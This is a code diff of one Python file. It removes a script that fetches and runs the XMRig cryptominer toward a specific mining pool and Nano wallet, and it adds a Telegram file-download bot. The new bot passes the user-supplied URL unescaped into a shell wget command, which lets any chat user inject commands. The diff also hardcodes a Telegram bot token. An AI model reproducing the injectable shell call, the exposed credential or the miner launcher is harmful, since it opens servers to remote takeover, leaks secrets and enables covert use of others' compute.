@@ -1,58 +1,76 @@
-import subprocess
-import requests
-import tarfile
 import os
+import subprocess
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+import asyncio
+import logging
 
-# Constants
-XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
-XMRIG_TAR = "xmrig-6.21.3-linux-static-x64.tar.gz"
-XMRIG_DIR = "./xmrig"
-XMRIG_BINARY = "./xmrig/xmrig"
+TOKEN = '7111705639:AAHeFXkCSSSuw_kBdvNTrRy5b0WyD-yY9lI'
 
-# Function to download and extract xmrig
-def download_and_extract_xmrig():
-    try:
-        response = requests.get(XMRIG_URL, stream=True)
-        with open(XMRIG_TAR, 'wb') as file:
-            for chunk in response.iter_content(chunk_size=1024):
-                if chunk:
-                    file.write(chunk)
-        with tarfile.open(XMRIG_TAR, 'r:gz') as tar:
-            tar.extractall(path=XMRIG_DIR)
-        os.remove(XMRIG_TAR)  # Remove the downloaded tar.gz file after extraction
-        print("Downloaded and extracted xmrig successfully")
-    except Exception as e:
-        print(f"Failed to download and extract xmrig: {e}")
-        raise
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
-# Run xmrig with specified parameters
-def run_xmrig():
-    try:
-        xmrig_command = f"{XMRIG_BINARY} -a gr -o stratum+ssl://ghostrider-asia.unmineable.com:443 -u XNO:nano_1hzgeyjjdue6u4zpjhnu8cwyok1d3xe3w3ysf56fw8ibe9pw8yumibxijopp.unmineable_worker_tltuwoiq -p x"
-        xmrig_process = subprocess.Popen(xmrig_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        # Print stdout and stderr in real-time
-        for line in iter(xmrig_process.stdout.readline, b''):
-            print(line.decode('utf-8').strip())
-        
-        xmrig_process.stdout.close()
-        xmrig_process.stderr.close()
-        xmrig_process.wait()
-    except Exception as e:
-        print(f"Error occurred while running xmrig: {e}")
-        raise
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    logger.info(f'Received /start command from {update.message.from_user.username}')
+    await update.message.reply_text('Send me a link and I will download the file for you. Use /download <link> to start the download.')
 
-# Main function to orchestrate the process
+async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if context.args:
+        url = context.args[0]
+        filename = url.split('/')[-1]
+        chat_id = update.message.chat_id
+
+        logger.info(f'Received download request from {update.message.from_user.username} for {url}')
+
+        await update.message.reply_text(f'Starting download for {url}')
+
+        # Use wget to download the file with progress output
+        command = f'wget --progress=dot -O {filename} {url}'
+
+        process = await asyncio.create_subprocess_shell(
+            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+
+        while True:
+            output = await process.stderr.readline()
+            if process.returncode is not None:
+                break
+            if output:
+                output = output.decode('utf-8')  # Decode the output manually
+                if '%' in output:
+                    try:
+                        progress = output.split()[-2]
+                        await context.bot.send_message(chat_id=chat_id, text=f'Download progress: {progress}')
+                        logger.info(f'Download progress: {progress}')
+                    except Exception as e:
+                        await context.bot.send_message(chat_id=chat_id, text=f'Error: {e}')
+                        logger.error(f'Error: {e}')
+
+        await process.communicate()
+
+        if process.returncode == 0:
+            await context.bot.send_message(chat_id=chat_id, text=f'Download complete: {filename}')
+            with open(filename, 'rb') as file:
+                await context.bot.send_document(chat_id=chat_id, document=file)
+            os.remove(filename)
+            logger.info(f'Download complete: {filename}')
+        else:
+            await context.bot.send_message(chat_id=chat_id, text='Download failed.')
+            logger.error('Download failed.')
+    else:
+        await update.message.reply_text('Please provide a link to download. Usage: /download <link>')
+
 def main():
-    # Ensure xmrig directory exists
-    if not os.path.exists(XMRIG_DIR):
-        os.makedirs(XMRIG_DIR)
-    
-    # Download and extract xmrig
-    download_and_extract_xmrig()
+    application = ApplicationBuilder().token(TOKEN).build()
 
-    # Run xmrig
-    run_xmrig()
+    start_handler = CommandHandler('start', start)
+    download_handler = CommandHandler('download', download)
 
-if __name__ == "__main__":
+    application.add_handler(start_handler)
+    application.add_handler(download_handler)
+
+    logger.info('Bot started')
+    application.run_polling()
+
+if __name__ == '__main__':
     main()
